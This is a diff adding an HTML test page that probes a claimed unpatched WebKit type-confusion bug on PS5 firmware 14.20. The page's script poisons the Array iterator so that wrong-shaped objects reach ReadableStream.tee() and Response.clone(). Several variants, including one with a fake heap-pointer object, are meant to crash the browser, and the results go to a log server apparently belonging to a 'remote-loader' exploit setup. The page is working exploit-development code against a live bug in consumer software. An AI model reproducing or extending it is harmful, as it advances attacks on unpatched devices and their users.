@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>CAND-A JSCell::toX / tee-sibling liveness (PS5 14.20)</title>
+</head>
+<body>
+<pre id="out">CAND-A liveness test — JSCell::toX family + InternalReadableStream::tee sibling
+8 crash-isolated variants (SAFE first, crash-oracle last)
+</pre>
+<script>
+/*
+ * CAND-A liveness probe (MIMO-PSY, 2026-10-15)
+ *
+ * Family (a): JSCell::toX unconditional casts (JSCell.cpp:148-168, JSCellInlines.h:445-450)
+ * plus the SAME defect shape at WebCore builtin glue. Target of this page:
+ *   InternalReadableStream::tee (InternalReadableStream.cpp:187-195) consumes the
+ *   readableStreamTee builtin's returned 2-array through the JS ITERATION protocol
+ *   (JSDOMConvertSequences.h:42-63) with only `ASSERT(results.size() == 2)` (debug-only)
+ *   and NO type check before InternalReadableStream::fromObject(*results[i].get()).
+ *   CVE-2026-43705's fix (WebKit 8fd92b1 / 316203@main) patched TransformStream.cpp
+ *   ONLY — this sibling is still unfixed on upstream main (fetched 2026-10-15).
+ * Trigger: Array.prototype[Symbol.iterator] poisoning + new ReadableStream(...).tee()
+ *   (ReadableStream.idl:42 -> ReadableStream.cpp:74-85) and Response(stream).clone()
+ *   (FetchBody.cpp:300-323). Pure interpreter/bytecode surface — no JIT required.
+ *
+ * Beacon protocol (identical to cve-43705-livetest.html):
+ *   synchronous same-origin POST /beacon/<stage>/<run>, run = per-render nonce.
+ *   L          page executed at all
+ *   U          ReadableStream missing (no verdict)
+ *   U2         Response missing (variant 3 skipped)
+ *   A<n>/B<n>  variant n start / survived (B body: threw=|signal=|BUGLIVE=)
+ *   E<n>       variant n threw its EXPECTED error = the guard is present = growth
+ *
+ * Reading the log (server side, host-beacons.log):
+ *   B2 with BUGLIVE=true  -> wrong-ShapedObject silently accepted = sibling LIVE (SAFE)
+ *   B3 with BUGLIVE=true  -> same via fetch body clone path = sibling LIVE (SAFE)
+ *   E2 / E3 (TypeError)   -> runtime size/type guard present => fix marker
+ *   A6 without B6  or  A7 without B7 -> under/truncated yield CRASHED => LIVE
+ *   B6/B7 with threw=TypeError      -> runtime guard present => fix marker
+ *   E4a..E4e       -> toX coercion battery: each expected throw = growth
+ *   L only / U / U2 -> no verdict for that surface
+ *
+ * Reload with #s0 .. #s7 to re-run ONLY that variant (useful after a crash).
+ */
+(function () {
+  "use strict";
+  var out = document.getElementById("out");
+  function say(s) { try { out.textContent += s + "\n"; } catch (e) {} }
+
+  var run = "r" + Date.now().toString(36) + "-" +
+            Math.random().toString(36).slice(2, 8);
+
+  // Crash-safe beacon: a synchronous XHR is fully sent before execution
+  // continues, so A cannot be lost and "A with no B" is unambiguous.
+  function beacon(stage, body) {
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", "/beacon/" + stage + "/" + run, false);
+      x.setRequestHeader("Content-Type", "text/plain;charset=utf-8");
+      x.send(body || "");
+    } catch (e) { /* logging must never throw */ }
+  }
+
+  say("run=" + run);
+  say("UA=" + navigator.userAgent);
+  beacon("L", "page loaded; ua=" + navigator.userAgent);
+
+  if (typeof ReadableStream === "undefined") {
+    beacon("U", "ReadableStream undefined; ua=" + navigator.userAgent);
+    say("UNSUPPORTED: ReadableStream is not a global");
+    return;
+  }
+  var haveFetch = (typeof Response !== "undefined");
+
+  var origIter = Array.prototype[Symbol.iterator];
+
+  function errStr(e) {
+    return (e && e.name) ? (e.name + "|" + String(e.message || "").slice(0, 120)) : String(e);
+  }
+
+  // A generic poisoned iterator over `this`: yields exactly `plan.length`
+  // values, taking each from plan[i] if present else the real element.
+  function poisonIter(plan) {
+    return function () {
+      var arr = this, i = 0;
+      return { next: function () {
+        if (i >= plan.length) return { done: true };
+        var val = (i < plan.length) ? plan[i] : arr[i];
+        i++;
+        return { value: val, done: false };
+      }};
+    };
+  }
+
+  // Runs one variant: beacon A<n>, trigger in try/catch, beacon B<n> (survived)
+  // or E<n> (expected throw = growth). Wrong shapes must THROW, not crash.
+  // plan === null => leave the iterator untouched (control / battery variants).
+  // expectThrow === false => a clean no-throw is the DESIRED outcome (v0).
+  function runVariant(n, desc, plan, trigger, expected, expectThrow) {
+    beacon("A" + n, "start variant " + n + " (" + desc + "); ua=" + navigator.userAgent);
+    say("variant " + n + " (" + desc + ") running...");
+    var threw = null, signal = "none";
+    try {
+      if (plan !== null)
+        Array.prototype[Symbol.iterator] = poisonIter(plan);
+      try {
+        signal = trigger();
+      } catch (e) {
+        threw = errStr(e);
+      }
+    } catch (e3) {
+      threw = threw || errStr(e3);
+    } finally {
+      Array.prototype[Symbol.iterator] = origIter;   // skipped only if we crashed
+    }
+    var expectedThrow = expected || "TypeError";
+    if (threw && threw.indexOf(expectedThrow) === 0) {
+      // Guard behaved correctly: expected-catch beacon = its own growth.
+      beacon("E" + n, "expected-throw:" + threw);
+      say("variant " + n + " EXPECTED-THROW " + threw);
+      return true;
+    }
+    // BEACON B — only reached if the trigger did not crash the process.
+    var buglive = ((expectThrow !== false) && threw === null) ? "true" : "false";
+    beacon("B" + n, "survived; threw=" + (threw || "none") +
+           "; signal=" + signal + "; BUGLIVE=" + buglive);
+    say("variant " + n + " SURVIVED threw=" + (threw || "none") + " signal=" + signal);
+    return true;
+  }
+
+  function cleanTee() {                 // v0: control — no poisoning effect
+    var s = new ReadableStream({ start: function (c) {} });
+    var pair = s.tee();
+    return "branches=" + pair.length;
+  }
+  function tee() {
+    var s = new ReadableStream({ start: function (c) {} });
+    var pair = s.tee();
+    return "branches=" + pair.length;
+  }
+  function fetchTee() {
+    var s = new ReadableStream({ start: function (c) {} });
+    var r = new Response(s);
+    var r2 = r.clone();
+    return "cloneOk=true";
+  }
+
+  var heapBuf = null;
+  try { heapBuf = new ArrayBuffer(65536); } catch (e) {}
+
+  // toX coercion battery: ReadableStreamInternals.js:63-64 does @toString(type)
+  // -> JSValue::toString -> JSCell::toStringInline/toPrimitive family (JSCell.cpp:148-168).
+  // Every one of these MUST throw; a wrong shape must not crash.
+  function toXBattery() {
+    var cases = [
+      ["4a", { valueOf: function () { return {}; }, toString: function () { return {}; } }],
+      ["4b", { [Symbol.toPrimitive]: function () { return {}; } }],
+      ["4c", { toString: function () { return Symbol("x"); } }]
+    ];
+    for (var i = 0; i < cases.length; i++) {
+      (function (label, weird) {
+        try {
+          new ReadableStream({ type: weird, start: function (c) {} });
+          beacon("B" + label, "survived; threw=none; BUGLIVE=true");
+          say("toX " + label + " SURVIVED (unexpected)");
+        } catch (e) {
+          beacon("E" + label, "expected-throw:" + errStr(e));
+          say("toX " + label + " EXPECTED-THROW " + errStr(e));
+        }
+      })(cases[i][0], cases[i][1]);
+    }
+    try {
+      var revocable = null;
+      try {
+        // Proxy is standard; if absent, skip silently into the catch below.
+        var p = Proxy.revocable({ toString: function () { return "x"; } }, {});
+        revocable = p;
+        p.revoke();
+        new ReadableStream({ type: p.proxy, start: function (c) {} });
+        beacon("B4d", "survived; threw=none; BUGLIVE=true");
+      } catch (e) {
+        beacon("E4d", "expected-throw:" + errStr(e));
+        say("toX 4d EXPECTED-THROW " + errStr(e));
+      }
+    } catch (e) {}
+    try {
+      new ReadableStream({ type: Symbol("t"), start: function (c) {} });
+      beacon("B4e", "survived; threw=none; BUGLIVE=true");
+    } catch (e) {
+      beacon("E4e", "expected-throw:" + errStr(e));
+      say("toX 4e EXPECTED-THROW " + errStr(e));
+    }
+    return "battery-done";
+  }
+
+  var stages = [
+    [0, "control: clean tee() (SAFE, no poisoning)", null, cleanTee, "TypeError", false],
+    [1, "tee over-yield: 3 values (SAFE)", [{}, {}, {}], tee, "TypeError"],
+    [2, "tee wrong-shape: 2 plain objects (SAFE)", [{ fake: 1 }, { fake: 2 }], tee, "TypeError"],
+    [3, "fetch-twin wrong-shape: Response(stream).clone() (SAFE)", [{ fake: 1 }, { fake: 2 }], fetchTee, "TypeError"],
+    [4, "toX coercion battery (SAFE, expected-throw only)", null, toXBattery, "TypeError"],
+    [5, "tee heap-ptr fake + touch branches (may crash if live)",
+      [{ pad: 0, ptr: heapBuf }, { pad: 1, ptr: heapBuf }], function () {
+        var s = new ReadableStream({ start: function (c) {} });
+        var pair = s.tee();
+        // Touch AFTER the wrap happened — this is where confusion would travel.
+        var t = "?";
+        try { t = "locked=" + pair[0].locked; } catch (e) { t = "touchThrew=" + errStr(e); }
+        return "branches=" + pair.length + ";" + t;
+      }, "TypeError"],
+    [6, "tee zero-yield: 0 values (crash-oracle if live)", [], tee, "TypeError"],
+    [7, "tee truncated: 1 value (crash-oracle if live)", [{}], tee, "TypeError"]
+  ];
+
+  var only = (location.hash || "").replace(/^#s?/, "");
+  if (/^[0-7]$/.test(only)) {
+    say("single-variant mode: #s" + only);
+    runVariant(stages[Number(only)][0], stages[Number(only)][1],
+               stages[Number(only)][2], stages[Number(only)][3], stages[Number(only)][4],
+               stages[Number(only)][5]);
+  } else {
+    for (var i = 0; i < stages.length; i++) {
+      if (stages[i][0] === 3 && !haveFetch) {
+        beacon("U2", "Response undefined; variant 3 skipped");
+        continue;
+      }
+      if (!runVariant(stages[i][0], stages[i][1], stages[i][2], stages[i][3], stages[i][4],
+                      stages[i][5])) break;
+    }
+  }
+
+  say("");
+  say("done. verdict is server-side: ps5-webkit-remote-loader/host-beacons.log");
+  say("B2/B3 BUGLIVE=true = sibling LIVE (safe) | E2/E3 = guard present | A6/A7 w/o B6/B7 = crash = LIVE | reload #s0..#s7.");
+})();
+</script>
+</body>
+</html>
